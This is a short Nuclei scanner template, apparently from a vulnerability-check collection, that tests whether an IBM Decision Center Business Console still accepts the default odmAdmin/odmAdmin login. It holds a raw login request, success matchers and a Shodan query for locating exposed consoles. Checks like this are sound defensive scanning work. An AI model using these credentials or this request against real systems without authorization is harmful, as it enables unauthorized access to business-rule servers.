http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'userName: ''odmAdmin'''
    - Log out
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 3
  payloads:
    password:
    - odmAdmin
    username:
    - odmAdmin
  raw:
  - 'POST /decisioncenter/j_security_check HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    j_username={{username}}&j_password={{password}}

    '
id: ibm-dcbc-default-login
info:
  author: DhiyaneshDK
  metadata:
    max-request: 1
    shodan-query: title="Decision Center | Business Console"
    verified: true
  name: IBM Decision Center Business Console - Default Login
  reference:
  - https://www.ibm.com/docs/en/odm/8.0.1?topic=users-tutorial-getting-started-decision-center-business-console
  severity: high
  tags: ibm,default-login,decision-center,vuln
